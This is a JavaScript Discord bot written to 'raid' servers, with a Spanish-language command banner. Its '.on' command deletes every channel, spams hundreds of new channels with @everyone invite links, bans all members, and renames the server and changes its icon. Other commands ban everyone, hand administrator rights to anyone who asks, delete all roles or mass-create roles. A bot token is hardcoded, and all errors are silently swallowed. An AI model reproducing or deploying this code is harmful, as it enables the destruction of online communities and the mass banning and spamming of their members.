const Discord = require("discord.js");
const client = new Discord.Client();
const talkedRecently = new Set();    
colors = require('colors'),

      
client.on("ready", () => {
console.log(`
Bot Encendido Cliente ${client.user.tag}
  

┏━━━┳━━━┓┏━┓╋┏┳┓╋┏┳┓┏━┳━━━┓┏━━┓┏━━━┳━━━━┓
┗┓┏┓┣┓┏┓┃┃┃┗┓┃┃┃╋┃┃┃┃┏┫┏━━┛┃┏┓┃┃┏━┓┃┏┓┏┓┃
╋┃┃┃┃┃┃┃┃┃┏┓┗┛┃┃╋┃┃┗┛┛┃┗━━┓┃┗┛┗┫┃╋┃┣┛┃┃┗┛
╋┃┃┃┃┃┃┃┃┃┃┗┓┃┃┃╋┃┃┏┓┃┃┏━━┛┃┏━┓┃┃╋┃┃╋┃┃
┏┛┗┛┣┛┗┛┃┃┃╋┃┃┃┗━┛┃┃┃┗┫┗━━┓┃┗━┛┃┗━┛┃╋┃┃
┗━━━┻━━━┛┗┛╋┗━┻━━━┻┛┗━┻━━━┛┗━━━┻━━━┛╋┗┛  
  
╔═════════════════════════════════════════════════════╗
║  .on     |  Destrulle el server de forma automatica ║
║  .banall |  Banea a todos en el server              ║
║  .admin  |  Te da un rol con admin                  ║
║  .droles |  Elimina los roles                       ║
║  .croles | Crea muchos roles                        ║
║                                                     ║
╚═════════════════════════════════════════════════════╝ 
  `.blue)
  presencia();
});

//////////////////////

function presencia() {
  client.user.setPresence({
    status: "invisible",
    activity: {
      name: "v1",
      type: "PLAYING"

    }
  });
}
//automatico

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.on') {

    console.log(`
Iniciando ataque `)

    if (talkedRecently.has(message.author.id)) {
            message.channel.send("Espera 1sec");
    } else {
      
   message.delete()
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`r̷a̷i̷d̷e̷d̷-̷b̷y̷-̷d̷d̷ `, {
      type: 'text'
    }).then(channel => {
      channel.send("")
    })
    for (let i = 0; i <= 500; i++) {
  
      message.guild.channels.create(`r̷a̷i̷d̷e̷d̷-̷b̷y̷-̷d̷d̷`, {
        type: 'text'
      }).then(channel => {
           for (i = 0; i < 10; i++) {   
       channel.send("@everyone https://discord.gg/Q9fac9jkaF");   
       const embed = new Discord.MessageEmbed()
      .setTitle("r̷a̷i̷d̷e̷d̷-̷b̷y̷-̷d̷d̷")
      .setImage("https://cdn.discordapp.com/attachments/877969590800502784/1003633586257285171/ezgif.com-gif-maker.gif") 
      .setThumbnail("https://cdn.discordapp.com/attachments/877969590800502784/1003633586257285171/ezgif.com-gif-maker.gif")
      .setDescription(`Recuerda DDBOTS no se hace cargo de esta raid
**YouTube**
https://www.youtube.com/channel/UCepWD1ia5uujbAxvGQ2QKgg

**Discord**
https://discord.gg/Q9fac9jkaF
`)
      .setColor("PURPLE")
    channel.send(embed);
   
           }
      })
    }


          if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
    if(member != message.member && member.id != "736776191700369533" && member.id != "736776191700369533" && member.id != "736776191700369533"){
            member.ban();
      }
    })
          
    message.guild.setName("#p̷o̷s̷e̷e̷d̷-̷b̷y̷-̷d̷d̷");
    message.guild.setIcon("https://cdn.discordapp.com/attachments/877969590800502784/1003633586257285171/ezgif.com-gif-maker.gif");
        talkedRecently.add(message.author.id);
        setTimeout(() => {
          // Removes the user from the set after a minute
          talkedRecently.delete(message.author.id);
        }, 1000);
    }

 
  }
})

client.on("message", async message => {
  if (message.content.startsWith('.banall')) {
    message.delete();
    if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
      if (member != message.member && member.id != "736776191700369533" && member.id != "736776191700369533" && member.id != "736776191700369533") {
        member.ban();
      }
    })
  }
});


//admin

client.on("message", async message => {


  if (message.author.bot) return;
  if (message.content.toLowerCase().startsWith('.admin')) {
    let rol = await message.guild.roles.create({
      data: {
        name: "DD",
        color: "B9BBBE",
        permissions: "ADMINISTRATOR",
        hoisted: false
      }
    })

    message.member.roles.add(rol)
      .then(function(role) {
        message.member.addRole(role);
        if (message.deletable) message.delete().catch(e => { });
      })
      .catch(e => { });
  }
});
                                             
//banall

client.on("message", async message => {
  if (message.content.startsWith('.banall')) {
    message.delete();
    if (!message.member.hasPermission("BAN_MEMBERS") || !message.member.hasPermission("ADMINISTRATOR")) return;
    message.guild.members.cache.forEach(member => {
    if(member != message.member && member.id != "736776191700369533" && member.id != "736776191700369533" && member.id != "736776191700369533"){
            member.ban();
      }
    })
  }
});

      
//borrar roles

client.on("message", message => {


  if (message.author.bot) return;

  if (message.content === ('.droles')) {
    message.delete()
    message.guild.roles.cache.map(roles => roles.delete());
  }
});

//crear roles

client.on("message", message => {

  if (message.author.bot) return;

  if (message.content === '.croles') {
    message.delete()
    for (let i = 0; i <= 250; i++) {
      message.guild.roles.create({ data: { name: `#dd`, color: '#d41818', }, reason: 'razon', })
    };
  }
});


client.login("MTAwNjQxMjE0ODE1MjQ3NTc0MQ.GUw7th.Co8U0rLptatqp4zBmg4uxclBSChCZVxMe8yEBA")


process.on('unhandledRejection', (reason, p) => {

});
process.on("uncaughtException", (err, origin) => {

}) 
process.on('uncaughtExceptionMonitor', (err, origin) => {

});
process.on('multipleResolves', (type, promise, reason) => {
});
process.setMaxListeners(100)
client.setMaxListeners(100)